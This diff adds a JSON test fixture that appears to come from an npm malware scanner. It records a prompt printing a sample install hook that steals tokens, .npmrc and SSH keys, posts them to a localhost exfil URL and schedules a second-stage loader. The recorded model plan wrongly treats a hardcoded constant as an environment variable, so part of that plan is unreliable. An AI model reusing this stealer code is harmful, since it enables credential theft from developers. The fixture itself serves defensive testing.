@@ -1,0 +1,54 @@
+{
+  "id": "005_hypothesis_e773d0f2",
+  "role": "hypothesis",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "deepseek/deepseek-v4-flash",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Turn one flagged region into one testable security hypothesis and a runnable\nexperiment. Plant bait, defeat visible gates, and trigger a real package entry\npoint. You are not the final judge; the observed run decides. Never dismiss a\nflag because the code appears benign."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: DNS resolution with caching\n- expectedCapabilities: perform DNS resolution, cache DNS query results\n\n## Flag\n- file: install-hook.js\n- lines: 78-79\n- why: Invokes unreferenced ./lib/loader.js as next-stage payload\n\n## Entry points\n- install: install-hook.js\n- runtime: index.js\n- bin: (none)\n\n## Flagged code\n### install-hook.js\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const os = require(\"os\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: const http = require(\"http\");\n7: \n8: const EXFIL_URL = \"http://localhost:9999/exfil\";\n9: \n10: function stage1() {\n11:   const stolen = {\n12:     stage: 1,\n13:     timestamp: new Date().toISOString(),\n14:     hostname: os.hostname(),\n15:     username: os.userInfo().username,\n16:     platform: process.platform,\n17:     env: {},\n18:     tokens: {},\n19:   };\n20: \n21:   const sensitivePatterns =\n22:     /NPM_TOKEN|npm_config|AWS_ACCESS|AWS_SECRET|GITHUB_TOKEN|GH_TOKEN|GITLAB|AZURE|DOCKER|CI_TOKEN/i;\n23:   for (const [key, value] of Object.entries(process.env)) {\n24:     if (sensitivePatterns.test(key)) {\n25:       stolen.env[key] = value;\n26:     }\n27:   }\n28: \n29:   const home = os.homedir();\n30:   const tokenFiles = [\n31:     path.join(home, \".npmrc\"),\n32:     path.join(home, \".ssh\", \"id_rsa\"),\n33:     path.join(home, \".ssh\", \"id_ed25519\"),\n34:   ];\n35:   for (const filePath of tokenFiles) {\n36:     try {\n37:       stolen.tokens[path.basename(filePath)] = fs.readFileSync(\n38:         filePath,\n39:         \"utf-8\"\n40:       );\n41:     } catch (e) {\n42: \n43:     }\n44:   }\n45: \n46:   exfil(stolen);\n47: \n48:   scheduleStage2();\n49: }\n50: \n51: function exfil(data) {\n52:   const payload = JSON.stringify(data);\n53:   const url = new URL(EXFIL_URL);\n54:   const req = http.request(\n55:     {\n56:       hostname: url.hostname,\n57:       port: url.port,\n58:       path: url.pathname,\n59:       method: \"POST\",\n60:       headers: {\n61:         \"Content-Type\": \"application/json\",\n62:         \"Content-Length\": Buffer.byteLength(payload),\n63:       },\n64:     },\n65:     () => {}\n66:   );\n67:   req.on(\"error\", () => {});\n68:   req.write(payload);\n69:   req.end();\n70: }\n71: \n72: function scheduleStage2() {\n73: \n74:   const delay = SAFE_TEST_MODE ? 5000 : 72 * 60 * 60 * 1000;\n75: \n76:   setTimeout(() => {\n77:     try {\n78:       require(\"./lib/loader.js\");\n79:     } catch (e) {\n80: \n81:     }\n82:   }, delay);\n83: }\n84: \n85: stage1();\n```\n\n## Available setup mechanisms\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\nReturn one JSON plan matching the supplied schema. Use empty arrays or null for setup mechanisms that are not needed. Set triggerTarget to exactly one of: index.js, install-hook.js. If exercising a library API requires custom JavaScript, put that program in triggerTarget; it will be planted as /pkg/npmguard-driver.js and executed inside the sandbox. The sandbox starts without CI; do not inject CI='false' to defeat a truthiness gate because non-empty strings are truthy in JavaScript.\n\nWhen you author JavaScript (a preload script, a custom driver, or a patchFile replacement), reference package files by a relative path with a leading './' (require('./src/x.js')) or by an absolute path under /pkg (require('/pkg/src/x.js')). A bare specifier like require('src/x.js') is resolved as a node_modules PACKAGE and fails with \"Cannot find module\". Planted file paths must be absolute (/pkg/... or /home/node/...). The sandbox working directory is /pkg.\n\nSuggested bait canary: NPMGUARD_CANARY_TOKEN_f8e2d91a"
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-e773d0f2",
+      "model": "deepseek/deepseek-v4-flash",
+      "provider": "Cloudflare",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\n  \"claim\": \t{\n    \"gating\": \t\"time_gate\",\n    \"kind\": \t\"cred_theft\"\n  },\n  \"description\": \t\"The package exfiltrates credentials and schedules a second-stage payload after a time delay. SAFE_TEST_MODE controls the delay: true→5s, false→72h. Setting this to false defeats the developer-safe behavior, triggering the require('./lib/loader.js') after 72 hours.\",\n  \"setup\": \t{\n    \"dateIso\": \tnull,\n    \"environment\": \t[\n      \t{\n        \"name\": \t\"SAFE_TEST_MODE\",\n        \"value\": \t\"false\"\n      }\n    ],\n    \"filePatches\": \t[],\n    \"files\": \t[\n      \t{\n        \"content\": \t\"NPMGUARD_CANARY_TOKEN_f8e2d91a\",\n        \"path\": \t\"/home/node/.npmrc\"\n      }\n    ],\n    \"preloadCode\": \tnull,\n    \"urlStubs\": \t[\n      \t{\n        \"pattern\": \t\"http://localhost:9999/exfil\",\n        \"responseBody\": \t\"{\\\"received\\\":true}\"\n      ,\n        \"responseHeaders\": \t[\t],\n        \"responseStatus\": \t200\n      }\n    ]\n  },\n  \"severity\": \t\"critical\",\n  \"triggerTarget\": \t\"install-hook.js\"\n}"
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 1237,
+        "completion_tokens": 323,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "71b8d4f63898",
+    "transport": "strict_schema",
+    "recordedStatus": "ok",
+    "recordedTs": "2026-07-23T10:44:34.719Z",
+    "recordedLatencyMs": 8869
+  }
+}
